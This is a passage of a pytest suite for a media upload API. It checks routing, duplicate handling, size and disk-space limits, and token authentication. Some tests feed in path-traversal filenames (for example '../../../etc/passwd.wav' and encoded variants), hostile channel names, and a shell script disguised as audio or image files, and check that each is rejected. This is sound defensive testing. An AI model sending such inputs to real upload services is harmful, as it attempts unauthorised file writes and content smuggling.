    assert response.json()["directory"] == "channels/lofi/images"
    assert (repo / "channels" / "lofi" / "images" / "city.jpg").is_file()
    assert not (repo / "common" / "images" / "city.jpg").exists()


def test_an_explicit_target_query_still_wins(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send_form(
        client,
        files=[("rain.wav", wav_bytes())],
        destination="common",
        route="/api/media/audio/upload",
        params={"target": "lofi"},
    )
    assert response.status_code == 200
    assert response.json()["directory"] == "channels/lofi/audio"


def test_the_response_carries_one_result_per_file(uploader) -> None:
    client, _state = uploader
    response = send_form(
        client, files=[("rain.wav", wav_bytes()), ("bad.mp3", SHELL_SCRIPT)]
    )
    assert response.status_code == 207
    results = response.json()["results"]
    assert [r["name"] for r in results] == ["rain.wav", "bad.mp3"]
    good, bad = results
    assert good["ok"] is True
    assert good["path"] == "common/audio/rain.wav"
    assert good["error"] is None
    assert bad["ok"] is False
    assert bad["error"] == "unsupported_content"
    assert bad["detail"]


@pytest.mark.parametrize("spelling", ["images", "image"])
def test_both_spellings_of_the_image_kind_are_accepted(
    uploader, repo: Path, spelling: str
) -> None:
    client, _state = uploader
    response = send_form(client, files=[(f"{spelling}.png", png_bytes())], kind=spelling)
    assert response.status_code == 200
    body = response.json()
    assert body["kind"] == "images"
    assert body["results"][0]["path"] == f"common/images/{spelling}.png"
    assert (repo / "common" / "images" / f"{spelling}.png").is_file()


# --------------------------------------------------------------------------
# 13. The same boundary, over the browser's shape
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "../passwd.wav",
        "../../../etc/passwd.wav",
        "..%2fpasswd.wav",
        "%2e%2e%2fpasswd.wav",
        "/etc/passwd.wav",
        "..\\..\\passwd.wav",
        "sub/../../passwd.wav",
        ".passwd.wav",
    ],
)
def test_traversal_payloads_are_rejected_over_the_form_route(
    uploader, repo: Path, payload: str
) -> None:
    client, _state = uploader
    response = send_form(client, files=[(payload, wav_bytes())])
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "invalid_filename"
    # Not in either tree, not anywhere else in the repo, not left in staging.
    assert list(repo.rglob("passwd.wav")) == []
    assert staged(repo) == []


@pytest.mark.parametrize(
    "payload",
    [
        "sub/dir/song.wav",
        # The multipart header parser unescapes this to a bare basename before
        # the backend ever sees it; it still may not become a directory here.
        "C:\\windows\\song.wav",
    ],
)
def test_a_path_component_is_stripped_to_a_basename(
    uploader, repo: Path, payload: str
) -> None:
    client, _state = uploader
    response = send_form(client, files=[(payload, wav_bytes())])
    assert response.status_code == 200
    assert response.json()["results"][0]["path"] == "common/audio/song.wav"
    assert (repo / "common" / "audio" / "song.wav").is_file()
    assert [p.name for p in (repo / "common" / "audio").iterdir()] == ["song.wav"]


def test_a_channel_upload_cannot_climb_into_another_tree(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send_form(
        client,
        files=[("../../../common/audio/stolen.wav", wav_bytes())],
        destination="channel",
        channel="lofi",
    )
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "invalid_filename"
    assert list(repo.rglob("stolen.wav")) == []


@pytest.mark.parametrize(
    ("name", "kind", "data"),
    [
        ("payload.mp3", "audio", SHELL_SCRIPT),
        ("payload.wav", "audio", SHELL_SCRIPT),
        ("payload.png", "images", SHELL_SCRIPT),
        ("actually.png", "images", jpeg_bytes()),
        ("actually.wav", "audio", png_bytes()),
    ],
)
def test_a_good_extension_cannot_carry_bad_content(
    uploader, repo: Path, name: str, kind: str, data: bytes
) -> None:
    client, _state = uploader
    response = send_form(client, files=[(name, data)], kind=kind)
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "unsupported_content"
    assert list(repo.rglob(name)) == []


def test_an_extension_outside_the_allowlist_is_rejected_by_the_form_route(uploader) -> None:
    """Deferred: the kind arrives after the bytes, so the allowlist has to
    fire at the end rather than on the part header."""
    client, _state = uploader
    response = send_form(client, files=[("payload.sh", SHELL_SCRIPT)])
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "unsupported_extension"


def test_oversize_is_refused_while_the_staged_body_streams(uploader, repo: Path) -> None:
    client, state = uploader
    state.workspace.ambient.uploads.max_file_mb = 1
    payload = wav_bytes() + b"\x00" * (2 * 1024 * 1024)
    response = send_form(client, files=[("huge.wav", payload)])
    assert response.status_code == 400
    result = response.json()["results"][0]
    assert result["error"] == "file_too_large"
    # Nothing was kept: the write stopped at the limit, it was not buffered.
    assert result["bytes"] == 0
    assert not (repo / "common" / "audio" / "huge.wav").exists()
    assert staged(repo) == []


def test_the_free_space_floor_is_honoured_by_the_form_route(
    uploader, repo: Path, monkeypatch
) -> None:
    client, state = uploader
    state.workspace.ambient.uploads.min_free_mb = 1
    monkeypatch.setattr(uploads, "free_bytes", lambda _directory: 512 * 1024)
    response = send_form(client, files=[("rain.wav", wav_bytes())])
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "insufficient_space"
    assert not (repo / "common" / "audio" / "rain.wav").exists()


def test_a_duplicate_name_is_refused_not_overwritten(uploader, repo: Path) -> None:
    client, _state = uploader
    assert send_form(client, files=[("rain.wav", wav_bytes())]).status_code == 200
    original = (repo / "common" / "audio" / "rain.wav").read_bytes()

    response = send_form(client, files=[("rain.wav", wav_bytes(1200))])
    assert response.status_code == 400
    assert response.json()["results"][0]["error"] == "already_exists"
    assert (repo / "common" / "audio" / "rain.wav").read_bytes() == original
    assert leftovers(repo / "common" / "audio") == []
    assert staged(repo) == []


def test_a_duplicate_is_deduplicated_only_when_asked(uploader, repo: Path) -> None:
    client, _state = uploader
    assert send_form(client, files=[("rain.wav", wav_bytes())]).status_code == 200
    response = send_form(
        client, files=[("rain.wav", wav_bytes(1200))], params={"on_conflict": "rename"}
    )
    assert response.status_code == 200
    result = response.json()["results"][0]
    assert result["name"] == "rain.wav"
    assert result["renamed"] is True
    assert result["path"] == "common/audio/rain-2.wav"
    assert (repo / "common" / "audio" / "rain-2.wav").is_file()


def test_a_rejected_file_leaves_no_partial_anywhere(uploader, repo: Path) -> None:
    client, _state = uploader
    assert send_form(client, files=[("payload.mp3", SHELL_SCRIPT)]).status_code == 400
    assert list((repo / "common" / "audio").iterdir()) == []
    assert staged(repo) == []


def test_one_bad_file_does_not_fail_a_form_batch(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send_form(
        client,
        files=[
            ("good.wav", wav_bytes()),
            ("../evil.wav", wav_bytes()),
            ("payload.mp3", SHELL_SCRIPT),
            ("also good.wav", wav_bytes(600)),
        ],
    )
    assert response.status_code == 207
    body = response.json()
    assert body["uploaded"] == 2 and body["failed"] == 2
    errors = {r["name"]: r["error"] for r in body["results"]}
    assert errors["../evil.wav"] == "invalid_filename"
    assert errors["payload.mp3"] == "unsupported_content"
    assert errors["good.wav"] is None
    assert (repo / "common" / "audio" / "good.wav").is_file()
    assert (repo / "common" / "audio" / "also good.wav").is_file()
    assert leftovers(repo / "common" / "audio") == []
    assert staged(repo) == []


def test_an_uploaded_image_is_profiled_beside_its_own_tree(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send_form(
        client,
        files=[("dawn.png", png_bytes())],
        kind="images",
        destination="channel",
        channel="lofi",
    )
    assert response.status_code == 200
    assert response.json()["results"][0]["profile"]["dominant"].startswith("#")
    assert (repo / "channels" / "lofi" / "profiles" / "dawn.json").is_file()
    assert not (repo / "common" / "profiles" / "dawn.json").exists()


# --------------------------------------------------------------------------
# 14. Naming the destination
# --------------------------------------------------------------------------


def test_an_unknown_channel_in_the_body_is_refused(uploader, repo: Path) -> None:
    client, _state = uploader
    response = send_form(
        client, files=[("rain.wav", wav_bytes())], destination="channel", channel="nope"
    )
    assert response.status_code == 404
    assert response.json()["error"] == "unknown_channel"
    assert not (repo / "channels" / "nope").exists()
    assert staged(repo) == []


@pytest.mark.parametrize("name", ["../../etc", "..", "lofi/../../etc", "LOFI", "a/b"])
def test_a_hostile_channel_name_in_the_body_is_refused(uploader, name: str) -> None:
    client, _state = uploader
    response = send_form(
        client, files=[("rain.wav", wav_bytes())], destination="channel", channel=name
    )
    assert response.status_code in (400, 404)
    assert response.json()["error"] in ("invalid_channel_name", "unknown_channel")


@pytest.mark.parametrize(
    ("fields", "error"),
    [
        ({"destination": None}, "missing_destination"),
        ({"destination": "channel"}, "missing_channel"),
        ({"destination": "elsewhere"}, "invalid_destination"),
        ({"kind": None}, "missing_kind"),
        ({"kind": "video"}, "invalid_kind"),
    ],
)
def test_the_form_route_defaults_nothing(uploader, repo: Path, fields, error) -> None:
    client, _state = uploader
    response = send_form(client, files=[("rain.wav", wav_bytes())], **fields)
    assert response.status_code == 400
    assert response.json()["error"] == error
    assert not (repo / "common" / "audio" / "rain.wav").exists()
    assert staged(repo) == []


def test_a_repeated_field_is_refused(uploader) -> None:
    """Two `destination` fields would leave which tree wins up to parse order."""
    client, _state = uploader
    response = send_form(
        client,
        files=[("rain.wav", wav_bytes())],
        destination="common",
        extra=[("destination", "channel")],
    )
    assert response.status_code == 400
    assert response.json()["error"] == "duplicate_field"


def test_the_form_route_requires_a_token(api) -> None:
    client, _state = api
    response = send_form(client, files=[("rain.wav", wav_bytes())], headers={})
    assert response.status_code == 401


def test_the_route_probe_gets_a_real_answer(uploader) -> None:
    """The UI probes with a body that carries `kind` and no file; 404 or 405
    would send it on to the next candidate."""
    client, _state = uploader
    response = send_form(client, files=[], destination=None)
    assert response.status_code == 400
    assert response.json()["error"] == "no_files"


def test_the_library_route_does_not_answer_a_post(uploader) -> None:
    client, _state = uploader
    assert client.post("/api/media/audio", headers=AUTH).status_code == 405


def test_a_non_multipart_body_is_refused_by_the_form_route(uploader) -> None:
    client, _state = uploader
    response = client.post(FORM_ROUTE, json={"files": []}, headers=AUTH)
    assert response.status_code == 400
    assert response.json()["error"] == "invalid_request"


def test_a_form_upload_reaches_a_connected_sse_client(uploader) -> None:
    client, state = uploader
    holder: dict = {}

    async def open_subscription():
        context = state.events.subscribe()
        holder["context"] = context
        return await context.__aenter__()

    subscriber = client.portal.call(open_subscription)
    try:
        client.portal.call(_status_first, state)
        response = send_form(
            client,
            files=[("dusk.png", png_bytes())],
            kind="images",
            destination="channel",
            channel="lofi",
        )
        assert response.status_code == 200
        payload = frame_named(client, subscriber, "media.uploaded")
    finally:
        client.portal.call(holder["context"].__aexit__, None, None, None)

    assert payload["channel"] == "lofi"
    assert payload["target"] == "lofi"
    assert payload["kind"] == "images"
    assert payload["files"] == ["dusk.png"]
